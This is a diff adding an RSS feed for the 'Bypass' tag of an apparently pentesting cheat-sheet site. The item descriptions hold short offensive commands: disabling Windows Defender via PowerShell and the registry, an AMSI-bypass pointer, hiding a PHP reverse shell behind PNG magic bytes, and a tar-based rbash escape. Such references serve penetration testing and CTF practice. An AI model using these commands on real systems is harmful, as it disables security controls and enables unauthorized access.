@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Bypass on TLDRBins</title>
+    <link>https://tldrbins.github.io/@bypass/</link>
+    <description>Recent content in Bypass on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@bypass/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Bypass ASMI</title>
+      <link>https://tldrbins.github.io/bypas_asmi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/bypas_asmi/</guid>
+      <description>Payloads Amsi-Bypass-Payloads&#xA;evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
+    </item>
+    <item>
+      <title>Defender (Windows)</title>
+      <link>https://tldrbins.github.io/windows_defender/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_defender/</guid>
+      <description> Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
+    </item>
+    <item>
+      <title>Magic Bytes</title>
+      <link>https://tldrbins.github.io/magic_bytes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/magic_bytes/</guid>
+      <description> png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
+    </item>
+    <item>
+      <title>rbash</title>
+      <link>https://tldrbins.github.io/rbash/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbash/</guid>
+      <description> Abuse #1: tar to rbash Escape # Before enter rbash echo $PATH # Enter rbash su &amp;lt;USER&amp;gt; - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </description>
+    </item>
+  </channel>
+</rss>
